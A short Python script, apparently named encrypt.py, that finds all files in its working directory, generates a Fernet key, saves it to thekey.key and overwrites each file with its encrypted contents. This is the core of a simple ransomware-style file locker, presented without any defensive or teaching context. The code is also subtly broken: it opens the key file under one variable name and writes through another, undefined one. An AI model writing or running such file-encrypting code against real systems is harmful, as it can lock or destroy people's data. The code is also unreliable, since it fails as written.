import os
from cryptography.fernet import Fernet
#encrypting files on a computer

files = []
for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

#generating a key
key = Fernet.generate_key()

with open("thekey.key","wb") as theykey:
	thekey.write(key)

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)
